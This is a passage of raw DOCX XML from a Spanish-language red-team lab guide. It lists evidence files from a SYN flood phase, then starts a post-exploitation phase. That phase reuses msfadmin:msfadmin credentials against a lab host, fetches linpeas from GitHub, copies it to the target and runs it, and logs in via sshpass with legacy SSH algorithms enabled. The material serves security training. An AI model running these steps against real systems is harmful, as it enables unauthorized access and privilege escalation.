          </w:tcPr>
          <w:p w14:paraId="79769CE8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>syn-flood.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="566E6864" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Log del SYN flood</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="44B17C49" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="0E689DEA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>syn-flood.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="5E7EE203" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Captura de paquetes del vector 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="702D7809" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="67F9C546" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>monitor-HHMMSS.csv</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7411F694" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Latencia durante el ataque (una línea por segundo)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="1AD0AB46" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="1B62DD3E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>evidence/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>pcap</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/capture-*.</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>pcap</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="3ACE639F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Captura global desde el host</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52474E1B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0110953F" w14:textId="1BDE06A8" w:rsidR="005F4B07" w:rsidRPr="005F4B07" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00176B77">
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2FB22416" wp14:editId="5E4E59EA">
            <wp:extent cx="5972810" cy="5448935"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="1208476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4766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544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C4C0F" w14:textId="29568F6E" w:rsidR="007C2578" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00176B77">
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78C94487" wp14:editId="5435D7E2">
            <wp:extent cx="5972810" cy="1937385"/>
            <wp:effectExtent l="0" t="0" r="8890" b="5715"/>
            <wp:docPr id="19837027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70270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93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59B32" w14:textId="7779A801" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="112F328A" wp14:editId="60F66748">
            <wp:extent cx="5972810" cy="4544060"/>
            <wp:effectExtent l="0" t="0" r="8890" b="8890"/>
            <wp:docPr id="1366881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8813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54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A150F" w14:textId="77777777" w:rsidR="005F4B07" w:rsidRPr="005F4B07" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="654EA4A7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">10. Fase 7 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Post-explotación</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="150F8645" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F9EB240" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Objetivo:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Con las credenciales </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>msfadmin:msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> obtenidas en Fase 4, ejecutar </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>linpeas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> para buscar rutas de escalada de privilegios.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56290908" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Prerequisito</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Conectividad SSH confirmada (verificada en Fase 4).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4C5231" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Ejecutar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2DFA1D49" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F423A2E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB_TARGET=172.20.0.20 SSH_USER=msfadmin SSH_PASS=msfadmin \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABEED8C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  bash /root/scripts/phase-7-post-exploitation/privesc-check.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69ABF0FE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04493803" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F6889C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace el script paso a paso:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E38105" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Verifica conectividad SSH como </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>msfadmin@172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD96713" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Descarga </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>linpeas.sh</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> desde GitHub (requiere internet en el Kali)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6853F79A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Copia </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>linpeas.sh</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> al target </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>via</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> SCP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784EB585" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ejecuta </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>linpeas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> remotamente y guarda el output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E96A2B4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Muestra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hallazgos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críticos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> (confianza ≥95%)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73ECC91A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Conexión SSH manual para la demo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEBD212" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec -it </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE6DE79" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  sshpass -p msfadmin ssh \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F18AF1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -o StrictHostKeyChecking=no \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6C2839" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -o KexAlgorithms=+diffie-hellman-group1-sha1 \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76500964" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -o 'MACs=+hmac-md5,hmac-sha1' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778536BD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">-o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>HostKeyAlgorithms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>ssh-rsa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C91E2C7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">    msfadmin@172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B5B859" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6DEFD2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D961BB0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Una vez dentro del target, ejecutar comandos de exploración:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B104F5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
